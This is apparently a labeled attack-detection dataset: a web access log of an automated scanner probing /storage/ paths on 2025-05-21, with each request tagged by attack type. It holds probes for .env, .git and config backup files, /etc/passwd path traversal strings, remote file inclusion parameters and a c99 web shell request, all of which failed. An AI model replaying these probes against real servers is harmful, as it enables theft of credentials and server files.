timestamp,ip,method,url,status,attack_type,user_agent
2025-05-21 05:49:32,173.239.196.15,GET,/storage/.env.prod,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.13,GET,/storage/.env.sample.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.10,GET,/storage/.env.production,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.11,GET,/storage/.env.prod.local,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.10,GET,/storage/.env.production.local,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.13,GET,/storage/.env.sample,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.11,GET,/storage/.env.save,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.13,GET,/storage/.env.stage,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.9,GET,/storage/.env.test,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.12,GET,/storage/.env.test.local,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.10,GET,/storage/.env.test.sample,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.11,GET,/storage/.environment,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.9,GET,/storage/.env.travis,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.14,GET,/storage/.envrc,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.9,GET,/storage/.envs,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.11,GET,/storage/.env~,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:32,173.239.196.13,GET,/storage/.ghc.environment,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.10,GET,/storage/.git/branches/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.10,GET,/storage/.git/COMMIT_EDITMSG,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.12,GET,/storage/.git/config,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/description,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/FETCH_HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.10,GET,/storage/.git/HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/head,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.13,GET,/storage/.git/hooks/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/hooks/commit-msg,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.14,GET,/storage/.git/hooks/applypatch-msg,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.14,GET,/storage/.git/hooks/pre-applypatch,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/hooks/pre-push,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/hooks/post-update,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/hooks/pre-commit,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.15,GET,/storage/.git/hooks/prepare-commit-msg,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.14,GET,/storage/.git/hooks/pre-rebase,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.13,GET,/storage/.git/hooks/update,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/hooks/pre-receive,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.15,GET,/storage/.git/info/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.15,GET,/storage/.git/index,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.13,GET,/storage/.git/info/exclude,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.12,GET,/storage/.git/info/attributes,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/info/refs,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.13,GET,/storage/.git/logs/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.10,GET,/storage/.git/logs/head,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/logs/HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.12,GET,/storage/.git/logs/refs,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.10,GET,/storage/.git/logs/refs/heads,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/logs/refs/heads/master,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/logs/refs/remotes,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.10,GET,/storage/.git/logs/refs/remotes/origin,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/logs/refs/remotes/origin/HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.13,GET,/storage/.git/objects/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/logs/refs/remotes/origin/master,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.14,GET,/storage/.git/objects/info/packs,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.14,GET,/storage/.git/packed-refs,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/refs/heads,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/refs/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.15,GET,/storage/.git/refs/heads/master,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.14,GET,/storage/.git/refs/remotes/origin,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.git/refs/remotes,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.13,GET,/storage/.git/refs/remotes/origin/HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.9,GET,/storage/.git/refs/remotes/origin/master,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.15,GET,/storage/.git/refs/tags,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:33,173.239.196.11,GET,/storage/.gitlab-ci/.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.14,GET,/storage/.htaccess-local,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.9,GET,/storage/.htaccess-marco,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.11,GET,/storage/.htaccess,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.14,GET,/storage/.htaccess-dev,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.15,GET,/storage/.htaccess.BAK,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.14,GET,/storage/.htaccess.bak,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.11,GET,/storage/.htaccess.inc,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.9,GET,/storage/.htaccess.bak1,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.10,GET,/storage/.htaccess.old,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.13,GET,/storage/.htaccess.orig,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.9,GET,/storage/.htaccess.txt,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.13,GET,/storage/.htaccess.sample,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.11,GET,/storage/.htaccess_extra,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.11,GET,/storage/.htaccess.save,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.10,GET,/storage/.htaccess_orig,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.15,GET,/storage/.htaccess/,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.13,GET,/storage/.htaccessBAK,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.13,GET,/storage/.htaccess_sc,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.12,GET,/storage/.htaccessOLD2,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.15,GET,/storage/.htaccessOLD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:34,173.239.196.9,GET,/storage/.htaccess~,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:39,173.239.196.9,GET,/storage/.vscode/.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:40,173.239.196.12,GET,/storage/.wp-config.php.swp,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:40,173.239.196.10,GET,/storage/1.htaccess,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:47,173.239.196.10,GET,/storage/admin/.htaccess,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:48,173.239.196.11,GET,/storage/admin/config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:48,173.239.196.12,GET,/storage/admin/portalcollect.php?f=http://xxx&t=js,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:50,173.239.196.15,GET,/storage/admin_config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:56,173.239.196.9,GET,/storage/administrator/.htaccess,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:58,173.239.196.10,GET,/storage/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:49:59,173.239.196.15,GET,/storage/app/.htaccess,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:02,173.239.196.11,GET,/storage/BackupConfig.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:04,173.239.196.13,GET,/storage/c99.php,404,Common Web Shell Access,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:05,173.239.196.11,GET,/storage/cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-21 05:50:07,173.239.196.14,GET,/storage/config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.9,GET,/storage/config.php.bak,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.11,GET,/storage/config.php-eb,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.9,GET,/storage/config.php.dist,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.14,GET,/storage/config.php.bkp,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.14,GET,/storage/config.php.inc,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.15,GET,/storage/config.php.txt,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.13,GET,/storage/config.php.inc~,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.9,GET,/storage/config.php.swp,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.11,GET,/storage/config.php.new,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.10,GET,/storage/config.php.save,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.11,GET,/storage/config.php~,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.9,GET,/storage/config.php.old,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:07,173.239.196.9,GET,/storage/config.php.zip,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:10,173.239.196.15,GET,/storage/dashboard/phpinfo.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:11,173.239.196.15,GET,/storage/deploy.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:12,173.239.196.13,GET,/storage/docpicker/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
